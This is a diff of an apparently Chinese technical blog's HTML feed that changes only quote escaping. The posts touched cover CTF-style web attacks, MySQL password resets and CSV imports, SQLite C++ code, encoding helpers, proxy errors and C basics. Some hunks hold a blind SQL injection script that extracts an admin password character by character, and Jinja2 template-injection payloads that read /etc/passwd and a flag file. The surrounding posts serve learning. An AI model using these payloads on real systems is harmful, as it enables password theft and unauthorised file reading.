@@ -130,13 +130,13 @@ randomblob()函数生成指定长度的随机字符串。当这个长度足够�
 &lt;p>我们编写了如下脚本来注入获取密码&lt;/p>
 &lt;pre tabindex="0">&lt;code>def sqlpw(url):
 session=requests.Session()
-params={&amp;quot;password&amp;quot;:&amp;quot;0&amp;quot;}
-password=&amp;quot;&amp;quot;
+params={&amp;#34;password&amp;#34;:&amp;#34;0&amp;#34;}
+password=&amp;#34;&amp;#34;
 for i in range(32):
-for x in &amp;quot;0123456789abcdefghijklmnopqrstuvwsyz&amp;quot;:
+for x in &amp;#34;0123456789abcdefghijklmnopqrstuvwsyz&amp;#34;:
 try:
-username=&amp;quot;admin'AND(SELECT(hex(substr(password,{},1)))FROM(users))=hex('{}')AND(randomblob(1000000000))--&amp;quot;.format(i+1,x)
-params['username']=username
+username=&amp;#34;admin&amp;#39;AND(SELECT(hex(substr(password,{},1)))FROM(users))=hex(&amp;#39;{}&amp;#39;)AND(randomblob(1000000000))--&amp;#34;.format(i+1,x)
+params[&amp;#39;username&amp;#39;]=username
 # print(params)
 r=session.post(url,data=params,timeout=1)
 # print(r.status_code)
@@ -229,11 +229,11 @@ __subclasses__() 返回子类
 &lt;p>获取基类&lt;/p>
 &lt;p>首先通过str，dict，tuple，list等类型来获取python的基本类（因为python万物皆对象）你也可以通过一些其它jinja2已经导入的包来获取基类&lt;/p>
 &lt;pre tabindex="0">&lt;code>python3:
-''.__class__.__base__
+&amp;#39;&amp;#39;.__class__.__base__
 [].__class__.__base__
 requests.__class__.__base__
 python2:
-''.__class__.__mro__[2]
+&amp;#39;&amp;#39;.__class__.__mro__[2]
 [].__class__.__base__
 requets.__class__.__mro__[8]
 &lt;/code>&lt;/pre>&lt;p>获取基类的方法可以在python命令行中输入尝试&lt;/p>
@@ -243,14 +243,14 @@ requets.__class__.__mro__[8]
 &lt;p>读取文件&lt;/p>
 &lt;p>&lt;strong>以下基类通过object代替&lt;/strong>&lt;/p>
 &lt;pre tabindex="0">&lt;code>python2：
-object.__subclasses__()[40]('/etc/password
-').read()
+object.__subclasses__()[40](&amp;#39;/etc/password
+&amp;#39;).read()
 //获取file类读文件
 &lt;/code>&lt;/pre>&lt;p>python3中要复杂的多，首先是python3的类层结构和python2下相比会复杂的多。其次python3的类必须经过初始化等等操作才可以使用其内建函数&lt;/p>
 &lt;pre tabindex="0">&lt;code>python3:
-object.__subclasses__()[78].__init__.__globals__.__builtins__.open(&amp;quot;./flag.txt&amp;quot;,encoding=&amp;quot;utf-8&amp;quot;).read()
+object.__subclasses__()[78].__init__.__globals__.__builtins__.open(&amp;#34;./flag.txt&amp;#34;,encoding=&amp;#34;utf-8&amp;#34;).read()
 &lt;/code>&lt;/pre>&lt;p>python3中我们获取子类列表之后随便选择一个类，查看其__init__&lt;/p>
-&lt;pre tabindex="0">&lt;code>&amp;lt;slot wrapper '__init__' of 'object' objects&amp;gt;
+&lt;pre tabindex="0">&lt;code>&amp;lt;slot wrapper &amp;#39;__init__&amp;#39; of &amp;#39;object&amp;#39; objects&amp;gt;
 &lt;/code>&lt;/pre>&lt;p>wrapper是指这些函数没有被重载。这是他们并不是function，并不具有___globals__属性。我们在多尝试几个子类就可以找到一个被__init__的类，比如。接下来就可以使用内置函数执行命令。&lt;/p>
 &lt;/li>
 &lt;/ol>
@@ -318,7 +318,7 @@ loading="lazy"
 &lt;li>
 &lt;p>然后使用数据库命令重置密码即可&lt;/p>
 &lt;pre tabindex="0">&lt;code>use mysql; -- 切换到mysql数据库
-update user set password=password(&amp;quot;123456&amp;quot;) where user=&amp;quot;root&amp;quot;; --修改密码为123456
+update user set password=password(&amp;#34;123456&amp;#34;) where user=&amp;#34;root&amp;#34;; --修改密码为123456
 &lt;/code>&lt;/pre>&lt;p>以上命令也可以用于你知道密码的情况下想要修改密码。
 不过在正常情况下执行完上述命令之后需要再增加如下命令刷新权限才可以让数据库密码更新成功（当然这里不需要）&lt;/p>
 &lt;pre tabindex="0">&lt;code>flush privileges;
@@ -342,7 +342,7 @@ update user set password=password(&amp;quot;123456&amp;quot;) where user=&amp;qu
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>接下来创建一个文本文件（sql.txt），指定在启动时需要执行的修改密码的命令。&lt;/p>
-&lt;pre tabindex="0">&lt;code>ALTER USER &amp;quot;root&amp;quot;@&amp;quot;localhost&amp;quot; IDENTIFIED BY &amp;quot;123456&amp;quot;;
+&lt;pre tabindex="0">&lt;code>ALTER USER &amp;#34;root&amp;#34;@&amp;#34;localhost&amp;#34; IDENTIFIED BY &amp;#34;123456&amp;#34;;
 &lt;/code>&lt;/pre>&lt;p>将密码重置为123456&lt;/p>
 &lt;/li>
 &lt;li>
@@ -371,7 +371,7 @@ update user set password=password(&amp;quot;123456&amp;quot;) where user=&amp;qu
 &lt;p>接下来重新开启一个命令行以空密码登陆数据库&lt;/p>
 &lt;pre tabindex="0">&lt;code>mysql -u root -p
 &lt;/code>&lt;/pre>&lt;p>提示输入密码直接按下回车即可。接下来重置密码&lt;/p>
-&lt;pre tabindex="0">&lt;code>update mysql.user set authenication_string=&amp;quot;123456&amp;quot; where user=&amp;quot;root&amp;quot; and host=&amp;quot;localhost&amp;quot;;
+&lt;pre tabindex="0">&lt;code>update mysql.user set authenication_string=&amp;#34;123456&amp;#34; where user=&amp;#34;root&amp;#34; and host=&amp;#34;localhost&amp;#34;;
 &lt;/code>&lt;/pre>&lt;p>执行成功无错误之后即表示密码重置成功&lt;/p>
 &lt;/li>
 &lt;li>
@@ -415,7 +415,7 @@ loading="lazy"
 &lt;p>解决这点，你只需要在mysql server的&lt;strong>安装路径&lt;/strong>下修改my.ini文件，并在其中修改如下内容（划重点，安装路径！！！安装路径里必定存在bin这类似文件夹）如果你有这个文件就找到对应的地方修改，如果没有就添加（注意开头不要有井号）&lt;/p>
 &lt;p>&lt;strong>修改文件最好备份my.ini因为如果这个文件内容错误mysql将无法启动&lt;/strong>&lt;/p>
 &lt;pre tabindex="0">&lt;code>[mysqld]
-secure-file-priv=&amp;quot;D:/CoderLife/testMySQL&amp;quot;
+secure-file-priv=&amp;#34;D:/CoderLife/testMySQL&amp;#34;
 # 这个路径你自己可以自定义
 &lt;/code>&lt;/pre>&lt;ul>
 &lt;li>如果你的mysql安装目录下不存在这个文件，你可以尝试去C:/Program Data/MySQL/MySQL Server类似路径下寻找（Program Data文件夹是一个隐藏文件夹，请勾选显示隐藏文件以及文件夹）&lt;/li>
@@ -424,7 +424,7 @@ secure-file-priv=&amp;quot;D:/CoderLife/testMySQL&amp;quot;
 &lt;/ul>
 &lt;pre tabindex="0">&lt;code>[mysqld]
 # 这里指定你想要设置的路径，必须保证这个路径存在
-secure-file-priv=&amp;quot;E:/test&amp;quot;
+secure-file-priv=&amp;#34;E:/test&amp;#34;
 [mysql]
 default-character-set=utf8
 [client]
@@ -438,7 +438,7 @@ net start mysql
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>接下来进入数据库，输入如下命令&lt;/p>
-&lt;pre tabindex="0">&lt;code>show variables like &amp;quot;%secure%&amp;quot;
+&lt;pre tabindex="0">&lt;code>show variables like &amp;#34;%secure%&amp;#34;
 &lt;/code>&lt;/pre>&lt;p>如果出现的回显中包含你之前设置的路径，则表示路径修改成功过&lt;/p>
 &lt;p>&lt;figure
 class="gallery-image"
@@ -486,7 +486,7 @@ net start mysql
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>进入数据库查看是否修改成功&lt;/p>
-&lt;pre tabindex="0">&lt;code> mysql&amp;gt; SHOW VARIABLES LIKE 'character%';
+&lt;pre tabindex="0">&lt;code> mysql&amp;gt; SHOW VARIABLES LIKE &amp;#39;character%&amp;#39;;
 +--------------------------+---------------------------------------------------------+
 | Variable_name            | Value                                                   |
 +--------------------------+---------------------------------------------------------+
@@ -555,18 +555,18 @@ loading="lazy"
 &lt;li>
 &lt;h3 id="导入命令问题">导入命令问题&lt;/h3>
 &lt;p>仅仅使用&lt;/p>
-&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;quot;file_name&amp;quot; INTO TABLE tbl_name
+&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;#34;file_name&amp;#34; INTO TABLE tbl_name
 &lt;/code>&lt;/pre>&lt;p>是无法完成插入操作的，大概率会出现如下报错&lt;/p>
 &lt;pre tabindex="0">&lt;code>Data truncated for column xxx at row 1
 &lt;/code>&lt;/pre>&lt;p>因为我们需要指定你准备导入的csv文件格式&lt;/p>
 &lt;ul>
 &lt;li>完整命令&lt;/li>
 &lt;/ul>
-&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;quot;D:/CoderLife/testMySQL/test.csv&amp;quot; -- 指定csv文件路径，路径必须是我们一开始设置的
+&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;#34;D:/CoderLife/testMySQL/test.csv&amp;#34; -- 指定csv文件路径，路径必须是我们一开始设置的
 INTO TABLE nation -- 指定你要插入的表格
-FIELDS TERMINATED BY ',' -- 指定csv文件是以逗号为分隔符
-ENCLOSED BY '&amp;quot;' -- 指定文本以双引号闭合
-LINES TERMINATED BY &amp;quot;\r\n&amp;quot;; -- 指定行按照如上格式换行
+FIELDS TERMINATED BY &amp;#39;,&amp;#39; -- 指定csv文件是以逗号为分隔符
+ENCLOSED BY &amp;#39;&amp;#34;&amp;#39; -- 指定文本以双引号闭合
+LINES TERMINATED BY &amp;#34;\r\n&amp;#34;; -- 指定行按照如上格式换行
 &lt;/code>&lt;/pre>&lt;ul>
 &lt;li>
 &lt;h3 id="拓展补充">拓展补充&lt;/h3>
@@ -590,32 +590,32 @@ LINES TERMINATED BY &amp;quot;\r\n&amp;quot;; -- 指定行按照如上格式换�
 &lt;h3 id="报错row-does-not-contain-data-for-all-columns">报错“Row does not contain data for all columns”&lt;/h3>
 &lt;p>这个报错是因为csv内的数据并没有包含表的所有键值，那么这就需要在我们导入数据的时候指定导入数据数据那几列
 就是在之前上面的导入代码最后加上一个括号，里面按照csv数据列的顺序依次标注其键名&lt;/p>
-&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;quot;D:/CoderLife/testMySQL/test.csv&amp;quot; -- 指定csv文件路径，路径必须是我们一开始设置的
+&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;#34;D:/CoderLife/testMySQL/test.csv&amp;#34; -- 指定csv文件路径，路径必须是我们一开始设置的
 INTO TABLE nation -- 指定你要插入的表格
-FIELDS TERMINATED BY ',' -- 指定csv文件是以逗号为分隔符
-ENCLOSED BY '&amp;quot;' -- 指定文本以双引号闭合
-LINES TERMINATED BY &amp;quot;\r\n&amp;quot; -- 指定行按照如上格式换行
+FIELDS TERMINATED BY &amp;#39;,&amp;#39; -- 指定csv文件是以逗号为分隔符
+ENCLOSED BY &amp;#39;&amp;#34;&amp;#39; -- 指定文本以双引号闭合
+LINES TERMINATED BY &amp;#34;\r\n&amp;#34; -- 指定行按照如上格式换行
 (key1,key2,key3); -- 指定你需要导入的键
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;h3 id="报错-incorrect-integer-value-xxx">报错“ Incorrect integer value: xxx”&lt;/h3>
 &lt;p>这个报错是因为csv文件第一行存在着表头数据，我们可以数用如下命令忽略第一行&lt;/p>
-&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;quot;D:/CoderLife/testMySQL/test.csv&amp;quot; -- 指定csv文件路径，路径必须是我们一开始设置的
+&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;#34;D:/CoderLife/testMySQL/test.csv&amp;#34; -- 指定csv文件路径，路径必须是我们一开始设置的
 INTO TABLE nation -- 指定你要插入的表格
-FIELDS TERMINATED BY ',' -- 指定csv文件是以逗号为分隔符
-ENCLOSED BY '&amp;quot;' -- 指定文本以双引号闭合
-LINES TERMINATED BY &amp;quot;\r\n&amp;quot; -- 指定行按照如上格式换行
+FIELDS TERMINATED BY &amp;#39;,&amp;#39; -- 指定csv文件是以逗号为分隔符
+ENCLOSED BY &amp;#39;&amp;#34;&amp;#39; -- 指定文本以双引号闭合
+LINES TERMINATED BY &amp;#34;\r\n&amp;#34; -- 指定行按照如上格式换行
 IGNORE 1 LINES -- 指定忽略第一行
 (key1,key2,key3); -- 指定你需要导入的键
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;h3 id="关于字符编码问题的补充">关于字符编码问题的补充&lt;/h3>
 &lt;p>其实可以通过指定导入的csv文件编码来保证字符编码问题，使用如下命令&lt;/p>
-&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;quot;D:/CoderLife/testMySQL/test.csv&amp;quot; -- 指定csv文件路径，路径必须是我们一开始设置的
+&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;#34;D:/CoderLife/testMySQL/test.csv&amp;#34; -- 指定csv文件路径，路径必须是我们一开始设置的
 INTO TABLE nation CHARACTER SET utf8-- 指定你要插入的表格
-FIELDS TERMINATED BY ',' -- 指定csv文件是以逗号为分隔符
-ENCLOSED BY '&amp;quot;' -- 指定文本以双引号闭合
-LINES TERMINATED BY &amp;quot;\r\n&amp;quot; -- 指定行按照如上格式换行
+FIELDS TERMINATED BY &amp;#39;,&amp;#39; -- 指定csv文件是以逗号为分隔符
+ENCLOSED BY &amp;#39;&amp;#34;&amp;#39; -- 指定文本以双引号闭合
+LINES TERMINATED BY &amp;#34;\r\n&amp;#34; -- 指定行按照如上格式换行
 IGNORE 1 LINES -- 指定忽略第一行
 (key1,key2,key3); -- 指定你需要导入的键
 &lt;/code>&lt;/pre>&lt;/li>
@@ -838,23 +838,23 @@ loading="lazy"
 using namespace std;
 //需要执行的sql语句
 const char sql[] = {
-&amp;quot;CREATE TABLE IF NOT EXISTS Users(&amp;quot;
-&amp;quot;ID INTEGER PRIMARY KEY NOT NULL,&amp;quot;
-&amp;quot;Stu_ID INTEGER,&amp;quot;
-&amp;quot;Password TEXT&amp;quot;
-&amp;quot;);&amp;quot;
+&amp;#34;CREATE TABLE IF NOT EXISTS Users(&amp;#34;
+&amp;#34;ID INTEGER PRIMARY KEY NOT NULL,&amp;#34;
+&amp;#34;Stu_ID INTEGER,&amp;#34;
+&amp;#34;Password TEXT&amp;#34;
+&amp;#34;);&amp;#34;
 };
 int main(){
 sqlite3 *db=NULL; //数据库句柄
 char *ErrMsg=NULL; //错误信息指针
 int rc=0; //函数执行返回值
-DATABASE=&amp;quot;./test.db&amp;quot;//需要连接的数据库路径
+DATABASE=&amp;#34;./test.db&amp;#34;//需要连接的数据库路径
 //连接数据库，并将返回的数据库句柄交给db
 rc=sqlite3_open(DATABASE,&amp;amp;db);
 if (rc){
 //如果链接失败关闭句柄退出程序
 sqlite3_close(db);
-cout&amp;lt;&amp;lt;&amp;quot;Cannot connect to &amp;quot;&amp;lt;&amp;lt;DATABASE&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34;Cannot connect to &amp;#34;&amp;lt;&amp;lt;DATABASE&amp;lt;&amp;lt;endl;
 return 0;
 }
 //执行sql语句
@@ -862,11 +862,11 @@ rc=sqlite3_exec(db,sql,NULL,NULL,&amp;amp;ErrMsg);
 if (rc){
 如果执行失败关闭句柄，打印出错误信息，退出程序
 sqlite3_close(db);
-cout&amp;lt;&amp;lt;&amp;quot;sql execute failed...&amp;quot;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34;sql execute failed...&amp;#34;&amp;lt;&amp;lt;endl;
 cout&amp;lt;&amp;lt;ErrMsg&amp;lt;&amp;lt;endl;
 return 0;
 }
-cout&amp;lt;&amp;lt;&amp;quot;table create&amp;quot;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34;table create&amp;#34;&amp;lt;&amp;lt;endl;
 //关闭数据库句柄释放内存
 sqlite3_close(db);
 return 0;
@@ -903,13 +903,13 @@ return 0;
 &lt;p>SQLite中的回调函数可以让我们自定义sql语句执行完成之后的操作。sqlite3_exec中执行的sql语句的执行结果会被默认传递给回调函数（如果你定义了的话）&lt;/p>
 &lt;/li>
 &lt;/ul>
-&lt;pre tabindex="0">&lt;code>sqlite3_exec(db,&amp;quot;select * from users;&amp;quot;,callback,&amp;quot;helloworld&amp;quot;,&amp;amp;ErrMsg)
+&lt;pre tabindex="0">&lt;code>sqlite3_exec(db,&amp;#34;select * from users;&amp;#34;,callback,&amp;#34;helloworld&amp;#34;,&amp;amp;ErrMsg)
 //该回调函数将会在sql语句执行时每一行数据返回时被执行
 static int callback(void *data,int argc,char **argv,char **azColName){
-//同时会打印由sqlite3_exec传入的参数&amp;quot;helloworld&amp;quot;
-printf(&amp;quot;%s&amp;quot;,(char*)data);
+//同时会打印由sqlite3_exec传入的参数&amp;#34;helloworld&amp;#34;
+printf(&amp;#34;%s&amp;#34;,(char*)data);
 for(int i=0;i&amp;lt;argc;i++){
-printf(&amp;quot;%s : %s\n&amp;quot;,azColName[i],argv[i]?argv[i]:&amp;quot;NULL&amp;quot;);
+printf(&amp;#34;%s : %s\n&amp;#34;,azColName[i],argv[i]?argv[i]:&amp;#34;NULL&amp;#34;);
 }
 return 0;
 }
@@ -921,15 +921,15 @@ return 0;
 sqlite3 *db=NULL; //定义数据库句柄
 sqlite3_stmt* stmt=NULL;//Statement handle 能令sqlite3_step()执行的编译好的准备语句的指针。调用sqlite3_finalize()删除它。
 const char *zTail=NULL; //Pointer to unusedportion of zSql 当zSql在遇见终止符或者达到设定的nByte结束后，如果还有剩余的内容，那么这些剩余的内容将被存放到pzTail中，不包含终止符
-const char sql[]=&amp;quot;select ID from users;&amp;quot;
+const char sql[]=&amp;#34;select ID from users;&amp;#34;
 int rc;
-rc=sqlite3_open(&amp;quot;./test.db&amp;quot;,&amp;amp;db);
+rc=sqlite3_open(&amp;#34;./test.db&amp;#34;,&amp;amp;db);
 if (rc) return;
 //准备sql语句
 if (sqlite3_prepare_v2(db,sql,strlen(sql),&amp;amp;stmt,&amp;amp;zTail)==SQLITE_OK){
 //步进执行，并获取执行结果
 while (sqlite3_step(stmt)==SQLITE_ROW)
-print(&amp;quot;%d\n&amp;quot;,sqlite3_column_int(stmt,0));
+print(&amp;#34;%d\n&amp;#34;,sqlite3_column_int(stmt,0));
 /*
 sqlite3_column_int(stmt,0) 第二个参数表示sql语句返回的数据的列数，从0开始，本例子中的sql语句只选取了ID那一列，所以这里只用数字0
 sqlite3_column_text()用以获取字符串类型返回值
@@ -954,22 +954,22 @@ return;
 //首先定义一个字符数组用以存放动态生成的sql语句
 char sql[1024]={0};
 //使用相对安全的没有缓冲区溢出漏洞的sprintf_s构造sql语句
-sprintf_s(sql,1024,&amp;quot;select * from users where ID=%d&amp;quot;,id);
+sprintf_s(sql,1024,&amp;#34;select * from users where ID=%d&amp;#34;,id);
 //如果你的编译器不支持sprintf_s()函数，也可使用相对不安全的sprintf()函数
-sprintf(sql,&amp;quot;select * from users where ID=%d&amp;quot;,id);
+sprintf(sql,&amp;#34;select * from users where ID=%d&amp;#34;,id);
 //执行sql语句，这里函数换成sqlite3_prepare_v2()也是一样
 sqlite3_exec(db,sql,NULL,NULL,&amp;amp;Errmsg);
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>使用sqlite3自带的绑定参数函数&lt;/p>
 &lt;pre tabindex="0">&lt;code>int id=1;
-char sql[1024]=&amp;quot;select * from users where ID=?&amp;quot;;
+char sql[1024]=&amp;#34;select * from users where ID=?&amp;#34;;
 sqlite3_stmt *stmt=NULL;
 sqlite3_prepare_v2(db,sql,strlen(sql),&amp;amp;stmt,NULL);
 //绑定整形参数到对应位置，参数位置从1开始
 sqlite3_bind_int(stmt,1,id);
 /*
-sqlite3_bind_text(stmt,pos,&amp;quot;halloworld&amp;quot;,strlen(&amp;quot;halloworld&amp;quot;),SQLITE_STATIC)
+sqlite3_bind_text(stmt,pos,&amp;#34;halloworld&amp;#34;,strlen(&amp;#34;halloworld&amp;#34;),SQLITE_STATIC)
 */
 ...
 &lt;/code>&lt;/pre>&lt;p>&lt;del>据说&lt;/del>使用sqlite3_bind_*()函数相对使用字符串处理函数更为节省内存，有一定程度可以规避sql注入攻击的效果（这里我感觉不是很苟同，这段是网上说的）&lt;/p>
@@ -983,17 +983,17 @@ std::wstring Utf82Unicode(const std::string&amp;amp; utf8string) {
 int widesize = ::MultiByteToWideChar(CP_UTF8, 0, utf8string.c_str(), -1, NULL, 0);
 if (widesize == ERROR_NO_UNICODE_TRANSLATION)
 {
-throw std::exception(&amp;quot;Invalid UTF-8 sequence.&amp;quot;);
+throw std::exception(&amp;#34;Invalid UTF-8 sequence.&amp;#34;);
 }
 if (widesize == 0)
 {
-throw std::exception(&amp;quot;Error in conversion.&amp;quot;);
+throw std::exception(&amp;#34;Error in conversion.&amp;#34;);
 }
 std::vector&amp;lt;wchar_t&amp;gt; resultstring(widesize);
 int convresult = ::MultiByteToWideChar(CP_UTF8, 0, utf8string.c_str(), -1, &amp;amp;resultstring[0], widesize);
 if (convresult != widesize)
 {
-throw std::exception(&amp;quot;La falla!&amp;quot;);
+throw std::exception(&amp;#34;La falla!&amp;#34;);
 }
 return std::wstring(&amp;amp;resultstring[0]);
 }
@@ -1002,24 +1002,24 @@ std::string WideByte2Acsi(std::wstring&amp;amp; wstrcode) {
 int asciisize = ::WideCharToMultiByte(CP_OEMCP, 0, wstrcode.c_str(), -1, NULL, 0, NULL, NULL);
 if (asciisize == ERROR_NO_UNICODE_TRANSLATION)
 {
-throw std::exception(&amp;quot;Invalid UTF-8 sequence.&amp;quot;);
+throw std::exception(&amp;#34;Invalid UTF-8 sequence.&amp;#34;);
 }
 if (asciisize == 0)
 {
-throw std::exception(&amp;quot;Error in conversion.&amp;quot;);
+throw std::exception(&amp;#34;Error in conversion.&amp;#34;);
 }
 std::vector&amp;lt;char&amp;gt; resultstring(asciisize);
 int convresult = ::WideCharToMultiByte(CP_OEMCP, 0, wstrcode.c_str(), -1, &amp;amp;resultstring[0], asciisize, NULL, NULL);
 if (convresult != asciisize)
 {
-throw std::exception(&amp;quot;La falla!&amp;quot;);
+throw std::exception(&amp;#34;La falla!&amp;#34;);
 }
 return std::string(&amp;amp;resultstring[0]);
 }
 //utf-8 转 ascii
 std::string UTF_82ASCII(std::string&amp;amp; strUtf8Code) {
 using namespace std;
-string strRet = &amp;quot;&amp;quot;;
+string strRet = &amp;#34;&amp;#34;;
 //先把 utf8 转为 unicode
 wstring wstr = Utf82Unicode(strUtf8Code);
 //最后把 unicode 转为 ascii
@@ -1032,17 +1032,17 @@ using namespace std;
 int widesize = MultiByteToWideChar(CP_ACP, 0, (char*)strascii.c_str(), -1, NULL, 0);
 if (widesize == ERROR_NO_UNICODE_TRANSLATION)
 {
-throw std::exception(&amp;quot;Invalid UTF-8 sequence.&amp;quot;);
+throw std::exception(&amp;#34;Invalid UTF-8 sequence.&amp;#34;);
 }
 if (widesize == 0)
 {
-throw std::exception(&amp;quot;Error in conversion.&amp;quot;);
+throw std::exception(&amp;#34;Error in conversion.&amp;#34;);
 }
 std::vector&amp;lt;wchar_t&amp;gt; resultstring(widesize);
 int convresult = MultiByteToWideChar(CP_ACP, 0, (char*)strascii.c_str(), -1, &amp;amp;resultstring[0], widesize);
 if (convresult != widesize)
 {
-throw std::exception(&amp;quot;La falla!&amp;quot;);
+throw std::exception(&amp;#34;La falla!&amp;#34;);
 }
 return std::wstring(&amp;amp;resultstring[0]);
 }
@@ -1052,20 +1052,20 @@ using namespace std;
 int utf8size = ::WideCharToMultiByte(CP_UTF8, 0, widestring.c_str(), -1, NULL, 0, NULL, NULL);
 if (utf8size == 0)
 {
-throw std::exception(&amp;quot;Error in conversion.&amp;quot;);
+throw std::exception(&amp;#34;Error in conversion.&amp;#34;);
 }
 std::vector&amp;lt;char&amp;gt; resultstring(utf8size);
 int convresult = ::WideCharToMultiByte(CP_UTF8, 0, widestring.c_str(), -1, &amp;amp;resultstring[0], utf8size, NULL, NULL);
 if (convresult != utf8size)
 {
-throw std::exception(&amp;quot;La falla!&amp;quot;);
+throw std::exception(&amp;#34;La falla!&amp;#34;);
 }
 return std::string(&amp;amp;resultstring[0]);
 }
 //ascii 转 Utf8
 std::string ASCII2UTF_8(std::string&amp;amp; strAsciiCode) {
 using namespace std;
-string strRet(&amp;quot;&amp;quot;);
+string strRet(&amp;#34;&amp;#34;);
 //先把 ascii 转为 unicode
 wstring wstr = Ascii2WideByte(strAsciiCode);
 //最后把 unicode 转为 utf8
@@ -1082,9 +1082,9 @@ return strRet;
 &lt;/ul>
 &lt;/li>
 &lt;li>就是在这的需求之下，代码持续爆出如下错误：
-&lt;pre tabindex="0">&lt;code>requests.exceptions.SSLError: SOCKSHTTPSConnectionPool(host='www.xxx.org', port=443): Max retries exceeded with url: /file/ (Caused by SSLError(SSLError(&amp;quot;bad handshake: SysCallError(-1, 'Unexpected EOF')&amp;quot;)))
-requests.exceptions.ConnectionError: SOCKSHTTPSConnectionPool(host='www.xxx.org', port=443): Max retries exceeded with url: /file/ (Caused by NewConnectionError('&amp;lt;urllib3.contrib.socks.SOCKSHTTPSConnection object at 0x0000021C585105C0&amp;gt;: Failed to establish a new connection: [Errno 11001] getaddrinfo failed'))
-requests.exceptions.SSLError: HTTPSConnectionPool(host='msft.com', port=443): Max retries exceeded with url: / (Caused by SSLError(&amp;quot;Can't connect to HTTPS URL because the SSL module is not available.&amp;quot;))
+&lt;pre tabindex="0">&lt;code>requests.exceptions.SSLError: SOCKSHTTPSConnectionPool(host=&amp;#39;www.xxx.org&amp;#39;, port=443): Max retries exceeded with url: /file/ (Caused by SSLError(SSLError(&amp;#34;bad handshake: SysCallError(-1, &amp;#39;Unexpected EOF&amp;#39;)&amp;#34;)))
+requests.exceptions.ConnectionError: SOCKSHTTPSConnectionPool(host=&amp;#39;www.xxx.org&amp;#39;, port=443): Max retries exceeded with url: /file/ (Caused by NewConnectionError(&amp;#39;&amp;lt;urllib3.contrib.socks.SOCKSHTTPSConnection object at 0x0000021C585105C0&amp;gt;: Failed to establish a new connection: [Errno 11001] getaddrinfo failed&amp;#39;))
+requests.exceptions.SSLError: HTTPSConnectionPool(host=&amp;#39;msft.com&amp;#39;, port=443): Max retries exceeded with url: / (Caused by SSLError(&amp;#34;Can&amp;#39;t connect to HTTPS URL because the SSL module is not available.&amp;#34;))
 ......
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>本文就来好好踩踩这些坑&lt;/li>
@@ -1120,7 +1120,7 @@ requests.exceptions.SSLError: HTTPSConnectionPool(host='msft.com', port=443): Ma
 &lt;/li>
 &lt;/ul>
 &lt;pre tabindex="0">&lt;code># socks5h://127.0.0.1:1080
-r=requests.get(URL,proxies={&amp;quot;https&amp;quot;:&amp;quot;socks5h://127.0.0.1:1080&amp;quot;})
+r=requests.get(URL,proxies={&amp;#34;https&amp;#34;:&amp;#34;socks5h://127.0.0.1:1080&amp;#34;})
 &lt;/code>&lt;/pre>&lt;p>&lt;del>对就是加了个h&lt;/del>&lt;/p>
 &lt;ul>
 &lt;li>加h的含义：
@@ -1140,7 +1140,7 @@ r=requests.get(URL,proxies={&amp;quot;https&amp;quot;:&amp;quot;socks5h://127.0.
 &lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
 int main(){
 /* 这是每个程序的开始 */
-printf(&amp;quot;Hello World!\n&amp;quot;); //这是另一种注释方法
+printf(&amp;#34;Hello World!\n&amp;#34;); //这是另一种注释方法
 return 0;
 }
 &lt;/code>&lt;/pre>&lt;ul>
@@ -1379,7 +1379,7 @@ signed 中文释义：有符号
 &lt;/ul>
 &lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
 void main(){
-printf(&amp;quot;hello world&amp;quot;);
+printf(&amp;#34;hello world&amp;#34;);
 return;
 }
 /*
@@ -1390,7 +1390,7 @@ return;
 &lt;/ul>
 &lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
 int func(void){
-printf(&amp;quot;hallo world&amp;quot;);
+printf(&amp;#34;hallo world&amp;#34;);
 return 0;
 }
 int main(){
@@ -1417,7 +1417,7 @@ return 0;
 #define N 100
 #define Good true
 #define x 1.2345
-#define newline '\n'
+#define newline &amp;#39;\n&amp;#39;
 //你也可以使用那个const关键字定义常量
 const double x=0.123456;
 &lt;/code>&lt;/pre>&lt;/li>
@@ -1431,15 +1431,15 @@ int x,y; //声明整形变量x，y
 float a;
 double b;
 char ch; //声明字符变量ch
-scanf(&amp;quot;%d&amp;quot;,&amp;amp;i); //从键盘输入数字i
-scanf(&amp;quot;%d %d&amp;quot;,&amp;amp;x,&amp;amp;y); //从键盘同时输入数字x,y
-scanf(&amp;quot;%f %lf&amp;quot;,&amp;amp;a,&amp;amp;b);
-scanf(&amp;quot;%c&amp;quot;,&amp;amp;ch); //从键盘读入一个字符ch
-printf(&amp;quot;hallo world\n&amp;quot;); //打印固定字符串
-printf(&amp;quot;%d\n&amp;quot;,i); //打印单个数字
-printf(&amp;quot;你输入的x=%d,y=%d\n&amp;quot;,x,y);//格式化输出
-printf(&amp;quot;单精度a=%f;双精度b=%.3lf&amp;quot;,a,b);//打印输出浮点类型，并限制位数
-printf(&amp;quot;%c&amp;quot;,ch);//打印单个字符
+scanf(&amp;#34;%d&amp;#34;,&amp;amp;i); //从键盘输入数字i
+scanf(&amp;#34;%d %d&amp;#34;,&amp;amp;x,&amp;amp;y); //从键盘同时输入数字x,y
+scanf(&amp;#34;%f %lf&amp;#34;,&amp;amp;a,&amp;amp;b);
+scanf(&amp;#34;%c&amp;#34;,&amp;amp;ch); //从键盘读入一个字符ch
